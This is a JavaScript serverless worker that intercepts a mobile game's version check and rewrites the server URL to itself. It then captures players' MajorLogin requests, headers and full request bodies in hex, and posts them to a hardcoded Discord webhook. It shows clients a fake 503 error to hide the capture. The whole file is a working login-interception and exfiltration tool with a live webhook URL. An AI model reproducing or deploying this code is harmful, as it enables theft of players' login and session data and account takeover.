export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname.toLowerCase();

    // ====================== VERSION ENDPOINT ======================
    // Handles: /live/ver.php (game appends this automatically)
    if (path.includes("ver.php") || path.includes("/live/ver") || path.endsWith("/ver")) {
      try {
        const officialUrl = new URL("https://version.ggwhitehawk.com/live/ver.php");

        // Forward all original parameters
        url.searchParams.forEach((value, key) => {
          officialUrl.searchParams.set(key, value);
        });

        const officialRes = await fetch(officialUrl.toString(), {
          method: "GET",
          headers: {
            "User-Agent": request.headers.get("User-Agent") || "UnityPlayer/2018.4.12f1",
            "Accept": "*/*",
          },
        });

        let data = await officialRes.json();

        // Replace server_url with our worker
        const myBaseUrl = `https://${url.host}/`;
        data.server_url = myBaseUrl;
        if (data.serverUrl) data.serverUrl = myBaseUrl;

        return new Response(JSON.stringify(data), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
          },
        });
      } catch (err) {
        return new Response(JSON.stringify({ error: "proxy failed", message: err.message }), {
          status: 500,
          headers: { "Content-Type": "application/json" },
        });
      }
    }

    // ====================== MAJOR LOGIN CAPTURE ======================
    if (path.includes("majorlogin") || request.method === "POST") {
      try {
        const bodyBuffer = await request.arrayBuffer();
        const bodyBytes = new Uint8Array(bodyBuffer);
        const hexBody = Array.from(bodyBytes).map(b => b.toString(16).padStart(2, "0")).join("");
        const headersObj = Object.fromEntries(request.headers);

        // Send to Discord
        await fetch("https://discord.com/api/webhooks/1555189702934667267/uJtdG3-cKtfINrpGMsKb0S_0qE4rM_esyQLZDy1jBKBSNif2QTj3tGNQWz35ZMbbAOUx", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "**Free Fire MajorLogin Captured**",
            embeds: [{
              title: "Login Request",
              color: 5763719,
              fields: [
                { name: "Path", value: `\`${request.method} ${url.pathname}\`` },
                { name: "Body Size", value: `${bodyBytes.length} bytes`, inline: true },
                { name: "Time", value: new Date().toISOString(), inline: true },
                { name: "Headers", value: "```json\n" + JSON.stringify(headersObj, null, 2).substring(0, 900) + "\n```" },
                { name: "Body Hex", value: "```\n" + hexBody.substring(0, 900) + (hexBody.length > 900 ? "\n...truncated" : "") + "\n```" }
              ]
            }]
          })
        });

        // Full hex if long
        if (hexBody.length > 900) {
          await fetch("https://discord.com/api/webhooks/1555189702934667267/uJtdG3-cKtfINrpGMsKb0S_0qE4rM_esyQLZDy1jBKBSNif2QTj3tGNQWz35ZMbbAOUx", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: "**Full Hex:**\n```\n" + hexBody + "\n```"
            })
          });
        }
      } catch (e) {
        console.log(e);
      }

      // Safe error response
      return new Response("Service Temporarily Unavailable", {
        status: 503,
        headers: { "Content-Type": "text/plain", "Retry-After": "1800" }
      });
    }

    return new Response("FF Capture Worker Online", { status: 200 });
  }
};
